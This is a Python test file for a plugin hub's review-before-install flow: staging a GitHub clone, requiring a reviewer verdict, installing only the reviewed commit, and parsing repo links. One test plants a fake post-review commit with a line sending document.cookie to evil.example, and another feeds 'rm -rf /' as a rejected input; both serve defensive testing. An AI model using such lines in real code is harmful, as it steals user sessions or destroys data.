""""Connect after review" (owner decision 2026-10-03: the hub itself reads the plugin's code and only then connects it,
with the user's consent): a clone at a commit goes into the review folder, Hub Developer gives a verdict
(`hub market verdict`), and exactly the reviewed clone is installed: a new author commit after the review does not
get in; "bad" is not installed."""
import tests  # noqa: F401 - ignore the machine's settings
import json
import os

from modules.market import market
from tests import test_market, test_web


class Review(test_market.Market):
    def test_staged_reviewed_then_installed_exactly(self):
        m = self.m()
        rec = m.stage("alice/hub-mascot")
        self.assertEqual(m.reviews()["alice/hub-mascot"]["state"], "checking")
        self.assertTrue(os.path.isfile(os.path.join(rec["path"], market.MANIFEST)))
        reviewed = rec["commit"]
        # the author changed the code after the review - the reviewed version is installed anyway
        src = os.path.join(self.gh, "alice", "hub-mascot")
        with open(os.path.join(src, "main.js"), "w") as f:
            f.write("fetch('https://evil.example/' + document.cookie)\n")
        test_market.git(src, "commit", "-qam", "after review")
        with self.assertRaises(market.Error):
            m.install("alice/hub-mascot", reviewed=True)               # no verdict yet
        m.verdict("alice/hub-mascot", "ok", "Only draws an owl, touches no network or files")
        self.assertEqual(m.reviews()["alice/hub-mascot"]["summary"], "Only draws an owl, touches no network or files")
        m.install("alice/hub-mascot", reviewed=True)
        ext = self.cfg()["extensions"]["alice:mascot"]
        self.assertEqual(ext["commit"], reviewed)
        with open(os.path.join(ext["path"], "main.js")) as f:
            self.assertNotIn("evil", f.read())

    def test_bad_verdict_is_not_installed(self):
        m = self.m()
        m.stage("alice/hub-stats")
        m.verdict("alice/hub-stats", "bad", "Sends the hub journal to a foreign server")
        with self.assertRaises(market.Error):
            m.install("alice/hub-stats", reviewed=True)
        with self.assertRaises(market.Error):
            m.verdict("alice/hub-stats", "great", "x")                   # only ok / risky / bad

    def test_link_any_repo_goes_through_review_only(self):
        # owner decision 2026-10-03: third-party plugins install through the hub from a pasted GitHub link, but only
        # through review: no marketplace needs connecting, yet nothing installs without a verdict
        self.assertEqual([market.repo_of(x) for x in (
            "https://github.com/alice/hub-mascot", "github.com/alice/hub-mascot.git", "alice/hub-mascot",
            "https://github.com/alice/hub-mascot/tree/main/src", "  https://github.com/alice/hub-mascot/  ")],
            ["alice/hub-mascot"] * 5)
        for bad in ("https://gitlab.com/alice/x", "alice", "alice/../x", "rm -rf /"):
            self.assertIsNone(market.repo_of(bad), bad)
        m = self.m()
        with self.assertRaises(market.Error):
            m.install("alice/hub-mascot")                                 # without review - no
        rec = m.stage("https://github.com/alice/hub-mascot")
        self.assertEqual((rec["repo"], rec["name"]), ("alice/hub-mascot", "mascot"))
        with self.assertRaises(market.Error):
            m.install("alice/hub-mascot", reviewed=True)                  # no verdict
        (card,) = [p for p in m.search("") if p["repo"] == "alice/hub-mascot"]   # visible in the catalog - with a verdict
        self.assertEqual((card["name"], card["link"]), ("mascot", True))
        m.verdict("alice/hub-mascot", "ok", "draws an owl")
        self.assertIn("alice:mascot", m.install("alice/hub-mascot", reviewed=True))
        self.assertEqual(self.cfg()["extensions"]["alice:mascot"]["source"], "alice/hub-mascot")
        self.assertFalse([p for p in m.search("") if p["repo"] == "alice/hub-mascot"])   # installed - not in the catalog

    def test_link_without_manifest_is_refused(self):
        self.repo("bob", "notes", {"name": "x"}, {"a.txt": "hi"})
        with open(os.path.join(self.gh, "bob", "notes", market.MANIFEST), "w") as f:
            f.write("not json")
        test_market.git(os.path.join(self.gh, "bob", "notes"), "commit", "-qam", "broken")
        with self.assertRaises(market.Error):
            self.m().stage("bob/notes")
        self.assertNotIn("bob/notes", self.m().reviews())


class Page(test_web.WebTest):
    """The page: "Review and install" - a clone into the review folder and a Hub Developer task; the verdict is in the catalog."""

    def test_review_button_stages_and_tells_the_hub_developer(self):
        from unittest import mock
        self.seed()
        staged = {"repo": "bob/hub-plugin-owl", "commit": "c0ffee1234", "path": "/tmp/x", "state": "checking"}
        with mock.patch.object(market.Market, "stage", return_value=staged) as stage:
            code, body = self.req("POST", "/api/plugins/review", {"repo": "bob/hub-plugin-owl"})
        self.assertEqual(code, 202)
        stage.assert_called_once_with("bob/hub-plugin-owl", to="hub-dev")
        (msg,) = [e for e in self.spooled() if e["type"] == "message.received"]
        self.assertEqual(msg["data"]["to"], "hub-dev")
        self.assertIn("hub market verdict bob/hub-plugin-owl", msg["data"]["text"])
        self.assertIn("c0ffee1", msg["data"]["text"])
        self.assertEqual(msg["data"]["button"], "Check and install")   # the feed names the button, not the task
        with mock.patch.object(market.Market, "stage", return_value=staged) as stage:   # by link - the same
            self.assertEqual(self.req("POST", "/api/plugins/review", {"repo": "https://github.com/bob/hub-plugin-owl"})[0], 202)
        stage.assert_called_once_with("bob/hub-plugin-owl", to="hub-dev")
        self.assertEqual([e for e in self.spooled() if e["type"] == "message.received"], [])   # a repeat: not a second task
        found = [{"name": "owl", "repo": "bob/hub-plugin-owl", "description": "d", "kinds": ["page"]}]
        with mock.patch.object(market.Market, "search", return_value=found), \
                mock.patch.object(market.Market, "reviews", return_value={"bob/hub-plugin-owl": {
                    **staged, "state": "ok", "summary": "draws an owl"}}):
            (p,) = json.loads(self.req("GET", "/api/plugins/search?q=")[1])["plugins"]
        self.assertEqual(p["review"], {"state": "ok", "summary": "draws an owl", "commit": "c0ffee1234"})


def load_tests(loader, standard, pattern):
    import unittest
    suite = unittest.TestSuite()
    for cls in (Review, Page):
        suite.addTests(cls(n) for n in cls.__dict__ if n.startswith("test"))
    return suite
